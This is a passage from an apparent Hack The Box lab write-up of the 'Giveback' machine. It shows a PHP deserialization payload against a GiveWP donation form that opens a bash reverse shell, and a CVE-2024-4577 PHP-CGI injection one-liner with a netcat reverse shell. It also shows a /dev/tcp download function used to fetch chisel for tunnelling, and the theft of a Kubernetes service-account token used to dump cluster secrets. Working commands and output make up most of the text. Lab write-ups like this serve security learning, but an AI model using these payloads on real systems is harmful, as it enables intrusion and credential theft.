{'give-form-id': '17', 'give-form-hash': '66e843c3e0', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Latasha', 'give_last': 'Shepherd', 'give_email': 'david23@example.com', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:56:"bash -c "/bin/bash -i >& /dev/tcp/10.10.16.97/9001 0>&1"";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.97] from (UNKNOWN) [10.129.70.248] 35308
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-786cd5b584-cq6m6:/opt/bitnami/wordpress/wp-admin$
```

## Enumeration (First Container)

Immediately we noticed that we got access as `root` but inside a `container`.

```shell
<-786cd5b584-cq6m6:/opt/bitnami/wordpress/wp-admin$ id
id
uid=1001 gid=0(root) groups=0(root),1001
```

On our search for `credentials` we first checked the `environment variables` and got a lot of `information` out of it.

Not only `credentials` for various components, we also found `information` about other `services (5000/TCP)` on at least one `additional container (10.43.2.241)`.

```shell
<-786cd5b584-cq6m6:/opt/bitnami/wordpress/wp-admin$ env
env
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-786cd5b584-cq6m6
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_SMTP_PROTOCOL=
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_DATABASE_SSL_KEY_FILE=
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_CLI_DAEMON_GROUP=daemon
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
WORDPRESS_NONCE_SALT=
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WP_NGINX_SERVICE_SERVICE_PORT=80
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
APACHE_SERVER_TOKENS=Prod
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
WEB_SERVER_DAEMON_USER=daemon
OS_ARCH=amd64
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```

To complete our enumeration we took a quick look at the `root directory` and spotted a few unusual directories like `bitnami` and `secrets`.

```shell
<-786cd5b584-cq6m6:/opt/bitnami/wordpress/wp-admin$ ls -la /
ls -la /
total 68
drwxr-xr-x   1 root root 4096 Nov  1 19:32 .
drwxr-xr-x   1 root root 4096 Nov  1 19:32 ..
-rw-rw-r--   1 root root    0 Jun 20 08:14 .rnd
lrwxrwxrwx   1 root root    7 Jun  5 12:32 bin -> usr/bin
drwxr-xr-x   3 root root 4096 Jun 20 08:14 bitnami
drwxr-xr-x   2 root root 4096 May  9 14:50 boot
drwxr-xr-x   5 root root  360 Nov  1 19:32 dev
drwxr-xr-x   1 root root 4096 Nov  1 19:32 etc
drwxr-xr-x   2 root root 4096 May  9 14:50 home
lrwxrwxrwx   1 root root    7 Jun  5 12:32 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  5 12:32 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Jun  5 12:32 media
drwxr-xr-x   2 root root 4096 Jun  5 12:32 mnt
drwxr-xr-x   3 root root 4096 Jun 20 08:14 opt
drwxr-xr-x   2 root root 4096 Jun 20 08:14 post-init.d
-rwxr-xr-x   1 root root  898 Jun 20 08:14 post-init.sh
dr-xr-xr-x 329 root root    0 Nov  1 19:32 proc
drwx------   2 root root 4096 Jun  5 12:32 root
drwxr-xr-x   4 root root 4096 Jun  5 12:32 run
lrwxrwxrwx   1 root root    8 Jun  5 12:32 sbin -> usr/sbin
drwxrwsrwt   3 root 1001  140 Nov  1 19:32 secrets
drwxr-xr-x   2 root root 4096 Jun  5 12:32 srv
dr-xr-xr-x  13 root root    0 Nov  1 19:32 sys
drwxrwsrwx   2 root 1001 4096 Nov  1 19:33 tmp
drwxr-xr-x  12 root root 4096 Jun 20 08:14 usr
drwxr-xr-x  11 root root 4096 Jun 20 08:14 var
```

## Lateral Movement to the second Container

### CVE-2024-4577: PHP-CGI Argument Injection

Now to move `laterally` we needed to find a way to bring our `tooling` like `chisel` for `port forwarding` to the box. Since `curl`, `wget` and other typical suspects were not available, we needed to get creative.

We created a custom `curl function` in `Bash` only.

```shell
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```shell
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

And after we copied our `binary` for `chisel` onto the box we spun up a `SOCKS Proxy` to forward all of our `local requests` with the use of `Proxychains` through the tunnel.

```shell
I have no name!@beta-vino-wp-wordpress-786cd5b584-cq6m6:/tmp$ __curl http://10.10.16.97/chisel > chisel
```

```shell
I have no name!@beta-vino-wp-wordpress-786cd5b584-cq6m6:/tmp$ chmod +x chisel
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Giveback/serve]
└─$ ./chisel server -p 9002 -reverse -v                   
2025/11/01 22:32:27 server: Reverse tunnelling enabled
2025/11/01 22:32:27 server: Fingerprint zBLdx4xP7FqBL/fLc+uxV9waja6ir2GmX4Y3+yVY0rs=
2025/11/01 22:32:27 server: Listening on http://0.0.0.0:9002
```

```shell
I have no name!@beta-vino-wp-wordpress-786cd5b584-cq6m6:/tmp$ ./chisel client 10.10.16.97:9002 R:socks  
<q6m6:/tmp$ ./chisel client 10.10.16.97:9002 R:socks          
2025/11/01 21:34:07 client: Connecting to ws://10.10.16.97:9002
2025/11/01 21:34:07 client: Connected (Latency 15.899529ms)
```

Next we grabbed our current `IP address` from within `/etc/hosts` to get an idea what else we eventually needed to look for and to understand where we were located inside the network.

```shell
I have no name!@beta-vino-wp-wordpress-786cd5b584-cq6m6:/tmp$ cat /etc/hosts
cat /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.42.1.198     beta-vino-wp-wordpress-786cd5b584-cq6m6

# Entries added by HostAliases.
127.0.0.1       status.localhost
```

According to the output of `env` we checked `10.43.2.241` on port `5000/TCP` and found a `status page` which leaked a few information about `PHP` and `CGI`. This combination often is a free ticket for `Remote Code Execution (RCE)` through various vulnerabilities.

- [http://10.43.2.241:5000/](http://10.43.2.241:5000/)

```shell
┌──(kali㉿kali)-[~]
└─$ proxychains -q curl http://10.43.2.241:5000/
<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>🏢 GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment – Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>⚠️ Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> — VPN Required</li>
      <li><a href="/backups/">/backups/</a> — VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
      <li><a href="/debug/">/debug/</a> — Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>
```

A bit research brought up another `CVE` which was `CVE-2024-4577`. It described `PHP CGI Argument Injection` in `PHP-CGI`. But the problem was the the initial vulnerability was found on a `Windows` operating system. Not on Linux.

- [https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)
- [https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/](https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/)

We fed the `PoC` to our `AI Companion` and asked him to create a `oneliner` based on it which we could point onto the `Web Server` of the `second container`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Giveback/files]
└─$ proxychains -q php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|busybox nc 10.10.16.97 6666 >/tmp/f']]);file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
PHP Notice:  file_get_contents(): Content-type not specified assuming application/x-www-form-urlencoded in Command line code on line 1
[START][END]
```

After a bit back and forth and a few tweaks we received a callback.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Giveback/serve]
└─$ nc -lnvp 6666                                                                listening on [any] 6666 ...
connect to [10.10.16.97] from (UNKNOWN) [10.129.70.248] 58696
sh: can't access tty; job control turned off
/var/www/html/cgi-bin #
```

## Enumeration (Second Container)

Now we started with the `Enumeration` on the `second container`. Once more we dropped into a shell as `root` and this time we went straight for the `Secrets` of the container since there was clearly some sort of `Orchestration` like `Kubernetes` available.

```shell
/var/www/html/cgi-bin # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

```shell
/var/www/html/cgi-bin # hostname
legacy-intranet-cms-6f7bf5db84-gb975
```

```shell
/var/www/html/cgi-bin # ls -la /run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root           140 Nov  1 21:58 .
drwxr-xr-x    3 root     root          4096 Nov  1 22:24 ..
drwxr-xr-x    2 root     root           100 Nov  1 21:58 ..2025_11_01_21_58_08.2907896644
lrwxrwxrwx    1 root     root            32 Nov  1 21:58 ..data -> ..2025_11_01_21_58_08.2907896644
lrwxrwxrwx    1 root     root            13 Nov  1 19:32 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Nov  1 19:32 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Nov  1 19:32 token -> ..data/token
```

## Privilege Escalation to babywyrm

### Kubernetes Secrets Exfiltration

Performing basic `Eumeration` on a `Kubernetes` related system was crucial to proceed. We found an `Authentication Token` and authenticated against the `API` to `Exfiltrate` the `Secrets` of the `Namespace`.

```shell
/var/www/html/cgi-bin # cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNTcwMjg4LCJpYXQiOjE3NjIwMzQyODgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMGNmZDgwMDMtMjBhMi00YjMwLThkZmEtYmQ1ZGM0NWQ4MzgxIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWI0ejhkIiwidWlkIjoiMDFlODRkZDMtY2ZiYS00ZTdkLThjZTEtYmFkMDM1ODE0ZjgzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjAzNzg5NX0sIm5iZiI6MTc2MjAzNDI4OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.LWbtOLLSlwKoVuGcB1FRAVIQqWDweI12V3pYjOs9wHkcmzvVcQmqHRu_7lSEizllgKb7qXk34z9xAgW8a_CkbNUoeh_IplmEOwg3TEh69id2vkGocyLmY5RjdcqvQRo6MYwx9dKIpXAKzrrTMB-8QX-ox7Z5CuGChbPyDa8beoFaKGuEOvg1phSirJcreLQ6EcnEeNePpSqOcBOFq01qM85uuPLtN9Pgj3PR4e7q-opnb3EH4Txd2Ly4beZiQkvSmQjnyGnfOTTMFd6xC_FBlcLOgEVOYtd_mCzlx3dyPm63WCRgGJpj_YhVr66f1xv7fOaLE2Wj5vSE2Z0H02MNJw
```

```shell
/var/www/html/cgi-bin # curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNTcwMjg4LCJpYXQiOjE3NjIwMzQyODgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMGNmZDgwMDMtMjBhMi00YjMwLThkZmEtYmQ1ZGM0NWQ4MzgxIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWI0ejhkIiwidWlkIjoiMDFlODRkZDMtY2ZiYS00ZTdkLThjZTEtYmFkMDM1ODE0ZjgzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjAzNzg5NX0sIm5iZiI6MTc2MjAzNDI4OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.LWbtOLLSlwKoVuGcB1FRAVIQqWDweI12V3pYjOs9wHkcmzvVcQmqHRu_7lSEizllgKb7qXk34z9xAgW8a_CkbNUoeh_IplmEOwg3TEh69id2vkGocyLmY5RjdcqvQRo6MYwx9dKIpXAKzrrTMB-8QX-ox7Z5CuGChbPyDa8beoFaKGuEOvg1phSirJcreLQ6EcnEeNePpSqOcBOFq01qM85uuPLtN9Pgj3PR4e7q-opnb3EH4Txd2Ly4beZiQkvSmQjnyGnfOTTMFd6xC_FBlcLOgEVOYtd_mCzlx3dyPm63WCRgGJpj_YhVr66f1xv7fOaLE2Wj5vSE2Z0H02MNJw" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2864809"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "beta-vino-wp-wordpress",
        "namespace": "default",
        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
        "resourceVersion": "2088228",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "wordpress",
          "app.kubernetes.io/version": "6.8.2",
          "helm.sh/chart": "wordpress-25.0.5"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:wordpress-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "wordpress-password": "TzhGN0tSNXpHaQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v58",
        "namespace": "default",
        "uid": "13034cd4-64e1-4e2e-9182-4ce0ffda27e8",
        "resourceVersion": "2123405",
        "creationTimestamp": "2025-08-30T05:17:49Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "58"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T05:21:45Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
<--- CUT FOR BREVITY --->
      },
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "f79177ef-6f8d-4bf4-bf91-1fa8eebbcaab",
        "resourceVersion": "2856470",
        "creationTimestamp": "2025-11-01T19:32:48Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "989f4806-6c06-4f13-9b3f-26fe918f3a48",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
